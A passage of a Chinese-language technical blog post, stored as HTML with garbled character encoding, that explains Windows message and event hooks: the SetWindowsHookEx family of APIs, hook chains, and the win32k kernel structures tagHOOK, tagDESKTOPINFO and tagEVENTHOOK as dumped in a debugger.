<li><em>nCode</em>ï¼šæŒ‡å®šé’©å­è¿‡ç¨‹æ˜¯å¦å¿…é¡»å¤„ç†æ¶ˆæ¯ã€‚å¦‚æœ<em>nCode</em>æ˜¯<strong>HC_ACTION</strong>ï¼Œé’©å­è¿‡ç¨‹å¿…é¡»å¤„ç†æ¶ˆæ¯ã€‚å¦‚æœ<em>nCode</em>å°äºé›¶ï¼Œé’©å­è¿‡ç¨‹å¿…é¡»å°†æ¶ˆæ¯ä¼ é€’ç»™<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/ms644974(v=vs.85)"><strong>CallNextHookEx</strong></a>å‡½æ•°ï¼Œè€Œæ— éœ€è¿›ä¸€æ­¥å¤„ç†ï¼Œå¹¶ä¸”å¿…é¡»è¿”å›<strong>CallNextHookEx</strong>è¿”å›çš„å€¼ã€‚</li>
<li><em>wParam</em> å’Œ <em>lParam</em> ï¼šå€¼ä¾èµ–äºé’©å­ç ï¼Œä½†æ˜¯å®ƒä»¬ä¸€èˆ¬åŒ…å«ç€ä¸å‘é€æˆ–æŠ•é€’çš„æ¶ˆæ¯ç›¸å…³çš„ä¿¡æ¯ã€‚</li>
</ul>
<p><strong>è¿”å›å€¼</strong>ï¼š</p>
<p>å¦‚æœ<em>nCode</em>å°äºé›¶ï¼Œé’©å­è¿‡ç¨‹å¿…é¡»è¿”å›<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/ms644974(v=vs.85)"><strong>CallNextHookEx</strong></a>è¿”å›çš„å€¼ã€‚</p>
<p>å¦‚æœ<em>nCode</em>å¤§äºæˆ–ç­‰äºé›¶ï¼Œå¼ºçƒˆå»ºè®®æ‚¨è°ƒç”¨<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/ms644974(v=vs.85)"><strong>CallNextHookEx</strong></a>å¹¶è¿”å›å…¶è¿”å›çš„å€¼ï¼›å¦åˆ™ï¼Œå®‰è£…äº†<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/ms644959(v=vs.85)"><strong>WH_CALLWNDPROC</strong></a>é’©å­çš„å…¶ä»–åº”ç”¨ç¨‹åºå°†ä¸ä¼šæ”¶åˆ°é’©å­é€šçŸ¥ï¼Œå› æ­¤è¡Œä¸ºä¸æ­£ç¡®ã€‚å¦‚æœé’©å­è¿‡ç¨‹ä¸è°ƒç”¨<strong>CallNextHookEx</strong>ï¼Œåˆ™è¿”å›å€¼åº”ä¸ºé›¶ã€‚</p>
<ol>
<li><code>return CallNextHookEx</code>ï¼Œè¡¨ç¤ºå°†æ¶ˆæ¯ç»§ç»­å¾€ä¸‹ä¼ é€’ã€‚</li>
<li><code>return 0</code>ï¼Œè¡¨ç¤ºå¯¹å½“å‰æ¶ˆæ¯å·²ç»å¤„ç†äº†ï¼Œå¹¶ä¸”å±è”½äº†ï¼Œæ¶ˆæ¯å°±ä¸ä¼šä¼ é€’äº†ã€‚ç›®æ ‡çª—å£ä¹Ÿä¸ä¼šå†æ”¶åˆ°è¯¥æ¶ˆæ¯ã€‚</li>
</ol>
<h4 id="é’©å­çš„å®‰è£…ã€ä¼ é€’ã€å¸è½½"><a href="#é’©å­çš„å®‰è£…ã€ä¼ é€’ã€å¸è½½" class="headerlink" title="é’©å­çš„å®‰è£…ã€ä¼ é€’ã€å¸è½½"></a>é’©å­çš„å®‰è£…ã€ä¼ é€’ã€å¸è½½</h4><p>é’©å­çš„å®‰è£…å‡½æ•°æ˜¯ <code>SetWindowsHookEx</code>ã€‚åœ¨é’©å­çš„å¤„ç†å›è°ƒå‡½æ•°ä¸­ï¼Œå¦‚æœå¯¹é’©åˆ°çš„æ¶ˆæ¯å¤„ç†åï¼Œè¿˜è¦ç»§ç»­å¾€åä¼ é€’è¯¥æ¶ˆæ¯ï¼Œå¯ä»¥è°ƒç”¨ <code>CallNextHookEx</code> å‡½æ•°ã€‚é’©å­çš„å¸è½½å‡½æ•°æ˜¯ <code>UnhookWindowsHookEx</code>ã€‚</p>
<p><strong>å®‰è£…é’©å­å‡½æ•°</strong>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK <span class="title">SetWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] <span class="keyword">int</span>       idHook,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HOOKPROC  lpfn,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HINSTANCE hmod,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD     dwThreadId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td>idHook</td>
<td>é’©å­ç±»å‹ï¼Œå³è¦é’©å–ä»€ä¹ˆç±»å‹çš„æ¶ˆæ¯ï¼Œä»¥ <code>WH_</code> ä¸‹æ ‡å¼€å§‹ã€‚ç›®å‰æœ‰ <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa">15 ç§</a>ã€‚</td>
</tr>
<tr>
<td>lpfn</td>
<td>é’©å­å‡½æ•°çš„åœ°å€ã€‚å±€éƒ¨é’©å­ï¼šå½“å‰è¿›ç¨‹ä¸­å®šä¹‰çš„é’©å­å‡½æ•°åœ°å€ã€‚å…¨å±€é’©å­ï¼šDLL ä¸­å¯¼å‡ºçš„é’©å­å‡½æ•°åœ°å€ã€‚</td>
</tr>
<tr>
<td></td>
<td>é’©å­å‡½æ•°æ‰€åœ¨æ¨¡å—çš„åŸºåœ°å€ã€‚å±€éƒ¨é’©å­ï¼šå¦‚æœé’©å­å‡½æ•°åœ¨å½“å‰è¿›ç¨‹ä¸­è¿›è¡Œå®šä¹‰çš„ï¼Œè¯¥å€¼ä¸º <code>NULL</code>ã€‚å…¨å±€é’©å­ï¼šè¯¥å€¼ä¸º DLL çš„åŠ è½½åŸºå€ï¼Œæ­¤ DLL åŠ è½½åˆ°æ‹¥æœ‰ç›®æ ‡çª—å£çš„çº¿ç¨‹çš„åœ°å€ç©ºé—´ä¸­ã€‚</td>
</tr>
<tr>
<td>dwThreadId</td>
<td>é’©å­çº¿ç¨‹ TIDã€‚å±€éƒ¨é’©å­ï¼š<code>GetCurrentThreadId()</code>ã€‚å…¨å±€é’©å­ï¼š<code>0</code>ã€‚</td>
</tr>
</tbody></table>
<p><strong>ä¼ é€’é’©å­å‡½æ•°</strong>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT <span class="title">CallNextHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in, optional] HHOOK  hhk,	<span class="comment">//é’©å­çš„å¥æŸ„ï¼Œç”±SetWindowsHookEx()å‡½æ•°è¿”å›ã€‚</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           <span class="keyword">int</span>    nCode,	<span class="comment">//é’©å­å‡½æ•°çš„nCode</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           WPARAM wParam,	<span class="comment">//é’©å­å‡½æ•°çš„wParam</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           LPARAM lParam	<span class="comment">//é’©å­å‡½æ•°çš„lParam</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<p><strong>å¸è½½é’©å­å‡½æ•°</strong>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">UnhookWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HHOOK hhk	<span class="comment">//é’©å­çš„å¥æŸ„ï¼Œç”±SetWindowsHookEx()å‡½æ•°è¿”å›ã€‚</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<p>å…¨å±€é’©å­ä»£ç ç¤ºä¾‹ï¼š<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/157994861">Windowsçª—å£ä¸æ¶ˆæ¯ï¼šé’©å­</a>ã€‚</p>
<p>å±€éƒ¨é’©å­ä»£ç ç¤ºä¾‹ï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38409301/article/details/121599765?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-121599765-blog-120734243.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-121599765-blog-120734243.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=2">windows hook(é’©å­)â€“è¿›ç¨‹é’©å­</a>ã€‚</p>
<h4 id="é’©å­é“¾è¡¨"><a href="#é’©å­é“¾è¡¨" class="headerlink" title="é’©å­é“¾è¡¨"></a>é’©å­é“¾è¡¨</h4><p>å°†é’©ä½ä¸åŒæ¶ˆæ¯çš„é’©å­å›è°ƒå‡½æ•°å­˜å‚¨åœ¨ä¸åŒçš„é“¾è¡¨ä¸­ï¼ˆæ ¹æ®é’©å­ç±»å‹ <code>idHook</code> å…±15ä¸ªé“¾è¡¨ï¼‰ï¼Œé»˜è®¤çš„é’©å­å®‰è£…åˆ°é“¾è¡¨çš„æ–¹å¼æ˜¯â€œé˜Ÿåˆ—å¼â€ï¼Œ<strong>åå®‰è£…çš„é’©å­å›è°ƒå‡½æ•°æ€»æ˜¯åœ¨é“¾è¡¨æœ€å‰é¢</strong>ã€‚</p>
<p>å®é™…ä¸Šæ¡Œé¢å †ä¸­æœ‰ 16 ä¸ªé’©å­ç±»å‹ç©ºé—´ã€‚æ¡Œé¢å †ä¿¡æ¯ <code>tagDESKTOPINFOè®°å½•äº†è¿™ä¸€äº‹å®ï¼š</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt tagDESKTOPINFO</span><br><span class="line">win32k!tagDESKTOPINFO</span><br><span class="line">...</span><br><span class="line">  +<span class="number">0x020</span> aphkStart : [<span class="number">16</span>] Ptr64 tagHOOK</span><br></pre></td></tr></table></figure>



<h4 id="æ¶ˆæ¯é’©å­ç»“æ„tagHOOK"><a href="#æ¶ˆæ¯é’©å­ç»“æ„tagHOOK" class="headerlink" title="æ¶ˆæ¯é’©å­ç»“æ„tagHOOK"></a>æ¶ˆæ¯é’©å­ç»“æ„tagHOOK</h4><p>æ¶ˆæ¯é’©å­ç»“æ„ä¸º <code>win32k!tagHOOK</code>ï¼šï¼ˆWindows7 SP1 x64ï¼‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt tagHOOK</span><br><span class="line">win32k!tagHOOK</span><br><span class="line">   +<span class="number">0x000</span> head             : _THRDESKHEAD</span><br><span class="line">   +<span class="number">0x028</span> phkNext          : Ptr64 tagHOOK</span><br><span class="line">   +<span class="number">0x030</span> iHook            : Int4B</span><br><span class="line">   +<span class="number">0x038</span> offPfn           : Uint8B</span><br><span class="line">   +<span class="number">0x040</span> flags            : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> ihmod            : Int4B</span><br><span class="line">   +<span class="number">0x048</span> ptiHooked        : Ptr64 tagTHREADINFO</span><br><span class="line">   +<span class="number">0x050</span> rpdesk           : Ptr64 tagDESKTOP</span><br><span class="line">   +<span class="number">0x058</span> nTimeout         : Pos <span class="number">0</span>, <span class="number">7</span> Bits</span><br><span class="line">   +<span class="number">0x058</span> fLastHookHung    : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>åç§»</th>
<th>æˆå‘˜</th>
<th>è§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td>+0x000</td>
<td>head</td>
<td>GUI ç”¨æˆ·å¯¹è±¡å…¬å…±å¤´ç»“æ„ï¼Œæ­¤å¤„ä¸º <code>_THRDESKHEAD</code>ï¼Œè¡¨ç¤ºæ¡Œé¢å †å¤´ç»“æ„ï¼Œä¸”é’©å­ç›¸å…³ä¿¡æ¯åœ¨æ¡Œé¢å †ä¿¡æ¯ <code>tagDESKTOPINFO</code> ç»“æ„ä¸­æœ‰æ‰€ä½“ç°ã€‚<mark class="label success">é’©å­ç»“æ„æ˜¯å’Œæ¡Œé¢ç›¸å…³çš„</mark></td>
</tr>
<tr>
<td>+0x028</td>
<td>phkNext</td>
<td>æŒ‡å‘åŒä¸€ä¸ªç±»å‹é’©å­é“¾ä¸­ä¸‹ä¸€ä¸ªé’©å­çš„æŒ‡é’ˆã€‚ å½“æŒ‚é’©è¿‡ç¨‹è°ƒç”¨ <code>CallNextHookEx</code> æ—¶ï¼Œç³»ç»Ÿä¼šä½¿ç”¨è¯¥æˆå‘˜å®šä½ä¸‹ä¸€ä¸ªæŒ‚é’©ã€‚</td>
</tr>
<tr>
<td>+0x030</td>
<td>iHook</td>
<td>å‡½æ•° <code>SetWindowsHookEx</code> çš„å‚æ•°ä¸€æŒ‡å®šçš„é’©å­ç±»å‹ã€‚</td>
</tr>
<tr>
<td>+0x038</td>
<td>offPfn</td>
<td>æŒ‚é’©è¿‡ç¨‹çš„ç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼ˆRVAï¼‰ã€‚ å±€éƒ¨é’©å­ï¼šä¸è°ƒç”¨ <code>SetwindowsHookEx</code> çš„ä»£ç ä½äºåŒä¸€æ¨¡å—ä¸­ï¼Œåˆ™ä¸ºæ¨¡å—åŸºå€çš„åç§»ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æˆå‘˜ <code>ihmod = -1</code>ã€‚ å…¨å±€æŒ‚é’©ï¼Œé’©å­å‡½æ•°ä½äº DLL ä¸­ï¼Œ<code>offPfn</code> æ˜¯ç›¸å¯¹äºè¯¥ DLL åŠ è½½åŸºåœ°çš„åç§»é‡ã€‚è€Œ <code>ihmod</code> æ˜¯ <code>win32k!aatomsysLoaded</code> åŸå­æ•°ç»„çš„ç´¢å¼•ï¼ˆè¯¥DLLè·¯å¾„åœ¨åŸå­è¡¨ä¸­ï¼‰ã€‚ è¦ç¡®å®š DLL çš„åç§°ï¼Œæ‚¨å¿…é¡»å°† <code>ihmod</code> è½¬æ¢ä¸ºåŸå­ï¼Œç„¶åè·å–åŸå­åç§°ã€‚</td>
</tr>
<tr>
<td>+0x048</td>
<td>ptiHooked</td>
<td>è¿™ä¸ªå€¼å¯ä»¥ç”¨æ¥æ ‡è¯†è¢«é’©ä½çš„çº¿ç¨‹ã€‚</td>
</tr>
<tr>
<td>+0x050</td>
<td>rpdesk</td>
<td>é’©å­æ‰€å±çš„æ¡Œé¢ã€‚ é’©å­ Hooks ä¸èƒ½è·¨è¶Šæ¡Œé¢è¾¹ç•Œã€‚</td>
</tr>
</tbody></table>
<p>å…³äº <code>tagHOOK.ihmod</code>ï¼š</p>
<p>å…³äºå…¨å±€é’©å­ï¼Œè¿›ç¨‹åŠ è½½çš„åŒ…å«é’©å­çš„ DLLå…¨è·¯å¾„ï¼Œä¼šæ”¾åˆ°å…¨å±€åŸå­è¡¨ä¸­ï¼ˆå…¨å±€åŸå­è¡¨çš„ä½ç½® <code>win32k!UserAtomHandleTable</code>ï¼‰ã€‚<br><code>win32k!aatomsysLoaded</code> æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè¯¥æ•°ç»„ä¸º <code>ATOM</code> ç±»å‹ï¼Œä½¿ç”¨è¯¥æ•°ç»„å­˜çš„åŸå­å€¼å¯ä»¥å¯¹åº”æ£€ç´¢åˆ° DLL çš„åç§°ï¼ˆå…¨è·¯å¾„ï¼‰ï¼Œè€Œæ­¤æ—¶çš„ <code>tagHOOK.ihmod</code> å³ä¸ºè¯¥æ•°ç»„çš„ç´¢å¼•ï¼š<code>aatomsysLoaded[tagHOOK.ihmod]</code> å³å¯æ‰¾åˆ°è¯¥ DLL çš„å…¨è·¯å¾„ã€‚å‚è€ƒã€Š<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-261767.htm">é«˜ç‰ˆæœ¬64ä½Win10ï¼ˆRS2æˆ–æ›´é«˜ï¼‰ä¸‹æšä¸¾æ¶ˆæ¯é’©å­çš„ä¸€ç§æ€è·¯</a>ã€‹ï¼Œè¿˜æœ‰ä¸€ç¯‡ä»‹ç»é’©å­çš„æ–‡ç« å€¼å¾—ä¸€è¯»ã€Š<a target="_blank" rel="noopener" href="http://blog.airesoft.co.uk/2011/07/hookers-underneath-the-sheets/">Hookers â€“ Underneath the Sheets</a>ã€‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATOM aatomsysLoaded[MAXOfBuckets];</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/10/13/FL2PBhNEVqMg5KC.png" alt="30.png"></p>
<h4 id="æšä¸¾æ‰€æœ‰æ¶ˆæ¯æŒ‚é’©"><a href="#æšä¸¾æ‰€æœ‰æ¶ˆæ¯æŒ‚é’©" class="headerlink" title="æšä¸¾æ‰€æœ‰æ¶ˆæ¯æŒ‚é’©"></a>æšä¸¾æ‰€æœ‰æ¶ˆæ¯æŒ‚é’©</h4><p>æ–¹æ³•ä¸€ï¼šéœ€è¦ä½¿ç”¨åˆ° <code>tagDESKTOP</code> ç»“æ„ï¼Œæˆ–è€…å¦‚æœå·²çŸ¥æŸä¸ªé’©å­ <code>tagHOOK</code> ç»“æ„çš„åœ°å€ï¼Œ<code>tagHOOK.head</code>ï¼ˆ<code>tagTHREADINFO</code>ï¼‰ä¹Ÿå¯ä»¥æšä¸¾å½“å‰æ¡Œé¢ä¸­æ‰€æœ‰çš„å·²å®‰è£…çš„é’©å­ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ¡Œé¢å †å¤´ç»“æ„</span></span><br><span class="line">kd&gt; dt _THRDESKHEAD</span><br><span class="line">win32k!_THRDESKHEAD</span><br><span class="line">   +<span class="number">0x000</span> h                : Ptr64 Void</span><br><span class="line">   +<span class="number">0x008</span> cLockObj         : Uint4B</span><br><span class="line">   +<span class="number">0x010</span> pti              : Ptr64 tagTHREADINFO</span><br><span class="line">   +<span class="number">0x018</span> rpdesk           : Ptr64 tagDESKTOP</span><br><span class="line">   +<span class="number">0x020</span> pSelf            : Ptr64 UChar</span><br><span class="line"></span><br><span class="line">kd&gt; dt tagDESKTOPINFO</span><br><span class="line">win32k!tagDESKTOPINFO</span><br><span class="line">   +<span class="number">0x000</span> pvDesktopBase    : Ptr64 Void</span><br><span class="line">   +<span class="number">0x008</span> pvDesktopLimit   : Ptr64 Void</span><br><span class="line">   +<span class="number">0x010</span> spwnd            : Ptr64 tagWND</span><br><span class="line">   +<span class="number">0x018</span> fsHooks          : Uint4B</span><br><span class="line">   +<span class="number">0x020</span> aphkStart        : [<span class="number">16</span>] Ptr64 tagHOOK</span><br><span class="line">   +<span class="number">0x0a0</span> spwndShell       : Ptr64 tagWND</span><br><span class="line">   +<span class="number">0x0a8</span> ppiShellProcess  : Ptr64 tagPROCESSINFO</span><br><span class="line">   +<span class="number">0x0b0</span> spwndBkGnd       : Ptr64 tagWND</span><br><span class="line">   +<span class="number">0x0b8</span> spwndTaskman     : Ptr64 tagWND</span><br><span class="line">   +<span class="number">0x0c0</span> spwndProgman     : Ptr64 tagWND</span><br><span class="line">   +<span class="number">0x0c8</span> pvwplShellHook   : Ptr64 VWPL</span><br><span class="line">   +<span class="number">0x0d0</span> cntMBox          : Int4B</span><br><span class="line">   +<span class="number">0x0d8</span> spwndGestureEngine : Ptr64 tagWND</span><br><span class="line">   +<span class="number">0x0e0</span> pvwplMessagePPHandler : Ptr64 VWPL</span><br><span class="line">   +<span class="number">0x0e8</span> fComposited      : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x0e8</span> fIsDwmDesktop    : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br></pre></td></tr></table></figure>

<p>æ¡Œé¢å †ä¿¡æ¯å­˜å‚¨åœ¨ <code>tagDESKTOPINFO</code> ç»“æ„ä¸­ã€‚è¯¥ç»“æ„å¯ä»¥åœ¨å†…æ ¸ç©ºé—´ <code>win32k!tagCLIENTINFO.pDeskInfo</code> ï¼Œæˆ–ç”¨æˆ·ç©ºé—´ <code>Teb.Win32ClientInfo.pDesklnfo</code> ä¸­æ‰¾åˆ°ï¼Œ åˆ™ <code>Teb.Win32ClientInfo</code> æ˜¯ <code>tagCLIENTINFO</code> ç»“æ„ã€‚</p>
<p>æ–¹æ³•äºŒï¼šè§æœ¬æ–‡ç¬¬äºŒç« â€”GUI-Windows 10ä»¥åçš„å˜åŒ–ã€‚</p>
<h3 id="1-2-äº‹ä»¶é’©å­"><a href="#1-2-äº‹ä»¶é’©å­" class="headerlink" title="1.2 äº‹ä»¶é’©å­"></a>1.2 äº‹ä»¶é’©å­</h3><p>æœ‰äº› Windows äº‹ä»¶å¹¶æ²¡æœ‰æ¶ˆæ¯å¯¹åº”ï¼Œè­¬å¦‚å¼¹å‡ºèœå•ï¼Œåˆ‡æ¢çª—å£ï¼Œè·å¾—ç„¦ç‚¹ï¼Œæ»šåŠ¨æ¡æ»šåŠ¨ç­‰ç­‰ï¼Œè¦æˆªè·è¿™äº›äº‹ä»¶å¯ä»¥ä½¿ç”¨<code>SetWinEventHook</code> å‡½æ•°ã€‚å…³äºæ¶ˆæ¯é’©å­å’Œäº‹ä»¶é’©å­çš„ä¸åŒï¼Œå¯ä»¥çœ‹ã€Š<a target="_blank" rel="noopener" href="http://www.cppblog.com/weiym/archive/2013/10/30/203991.html">HOOKæŠ€æœ¯çš„ä¸€äº›ç®€å•æ€»ç»“</a>ã€‹ã€ã€Š<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269522.htm#msg_header_h2_4">HOOKæŠ€æœ¯ å­¦ä¹ æ€»ç»“</a>ã€‹ã€‚</p>
<p>ç±»ä¼¼æ¶ˆæ¯é’©å­ï¼Œå½“æ¡Œé¢ä¸ŠæŸä¸ªäº‹ä»¶&#x2F;åŠ¨äº§äº§ç”Ÿæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å®‰è£…ç›‘æ§è¯¥äº‹ä»¶çš„é’©å­ã€‚ç§°ä¸ºäº‹ä»¶é’©å­ï¼ˆEvent Hookï¼‰ã€‚</p>
<blockquote>
<p>å½“æŸäº›ä¸ Ul ç›¸å…³çš„äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨äº‹ä»¶é’©å­æ¥æ¥æ”¶é€šçŸ¥ã€‚ ä¾‹å¦‚ï¼š</p>
<ol>
<li>Windows èµ„æºç®¡ç†å™¨åœ¨æ’­æ”¾å£°éŸ³æ—¶è§¦å‘äº‹ä»¶ (EVENT_SYSTEM _SOUND)ã€‚</li>
<li>å½“æ»šåŠ¨æ“ä½œå¼€å§‹æ—¶ï¼ˆEVENT_SYSTEM_SCROLLSTARTï¼‰</li>
<li>å½“èœå•æ ä¸­çš„æŸä¸ªé¡¹ç›®ï¼ˆä¾‹å¦‚â€œå¼€å§‹â€èœå•ï¼‰è¢«é€‰ä¸­æ—¶ (EVENT_SYSTEM _ MENUSTART)ã€‚</li>
<li>å¦‚æœå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºæƒ³è¦åœ¨å‘å‡ºå£°éŸ³æ—¶åœ¨ç³»ç»Ÿæ‰˜ç›˜ä¸­æ˜¾ç¤ºä¸€ä¸ªå°æ‰¬å£°å™¨å›¾æ ‡ï¼Œä»–ä»¬å¯ä»¥é€šè¿‡å®‰è£…ä¸€ä¸ªç›‘å¬ EVENT_SYSTEM_SOUND çš„äº‹ä»¶é’©å­æ¥åŒæ­¥è¡Œä¸ºã€‚</li>
</ol>
</blockquote>
<p>äº‹ä»¶é’©å­çš„ç»“æ„ä¸º <code>tagEVENTHOOK</code>ï¼Œä½†æ˜¯å¾®è½¯æ²¡æœ‰è¯¥ç»“æ„çš„ç¬¦å·ï¼Œä»¥ä¸‹ç½—åˆ— Windows 7 x64ï¼ˆWindows 10 1703å‰çš„ç»“æ„å¯å‚è€ƒ<a target="_blank" rel="noopener" href="https://www.essentialobjects.com/forum/postsm51964_eowpexe-calls-SetWinEventHook-event.aspx">win32kbase!tagEVENTHOOK</a>ï¼‰ï¼š</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dt(<span class="string">&quot;tagEVENTHOOK&quot;</span>)</span><br><span class="line">&#x27;tagEVENTHOOK&#x27; (None bytes)</span><br><span class="line"><span class="number">0x00</span>  : head                           [_THROBJHEAD]</span><br><span class="line">0x18  : phkNext                        [&#x27;pointer&#x27;, [&#x27;tagEVENTHOOK&#x27;]]</span><br><span class="line">0x20  : eventMin                       [&#x27;Enumeration&#x27;, &#123;&#x27;target&#x27;: &#x27;unsigned long&#x27;, </span><br><span class="line">                                                        &#x27;choices&#x27;: &#123;1: &#x27;EVENT_MIN&#x27;, 2: &#x27;EVENT_SYSTEM_ALERT&#x27;, [snip]</span><br><span class="line">0x24  : eventMax                       [&#x27;Enumeration&#x27;, &#123;&#x27;target&#x27;: &#x27;unsigned long&#x27;, </span><br><span class="line">                                                        &#x27;choices&#x27;: &#123;1: &#x27;EVENT_MIN&#x27;, 2: &#x27;EVENT_SYSTEM_ALERT&#x27;, [snip]</span><br><span class="line">0x28  : dwFlags                        [&#x27;unsigned long&#x27;]</span><br><span class="line">0x2c  : idProcess                      [&#x27;unsigned long&#x27;]</span><br><span class="line">0x30  : idThread                       [&#x27;unsigned long&#x27;]</span><br><span class="line">0x40  : offPfn                         [&#x27;unsigned long long&#x27;]</span><br><span class="line">0x48  : ihmod                          [&#x27;long&#x27;]</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šçš„æˆå‘˜å¤§éƒ¨åˆ†å’Œäº‹ä»¶é’©å­å®‰è£…å‡½æ•° <code>SetWinEventHook</code> çš„<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwineventhook">å‚æ•°</a>ç›¸åŒã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HWINEVENTHOOK <span class="title">SetWinEventHook</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD        eventMin,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD        eventMax,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HMODULE      hmodWinEventProc,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] WINEVENTPROC pfnWinEventProc,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD        idProcess,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD        idThread,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD        dwFlags</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><code>tagEVENTHOOK</code> ç»“æ„æˆå‘˜è§£æï¼š</p>
<table>
<thead>
<tr>
<th>æˆå‘˜</th>
<th>è§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td>head</td>
<td>å¯¹è±¡å¤´ï¼Œ<code>_THROBJHEAD</code> ç»“æ„ã€‚</td>
</tr>
<tr>
<td>phkNext</td>
<td>æŒ‡å‘é’©å­é“¾è¡¨ä¸­çš„ä¸‹ä¸€ä¸ªé’©å­ã€‚</td>
</tr>
<tr>
<td>eventMin&#x2F;eventMax</td>
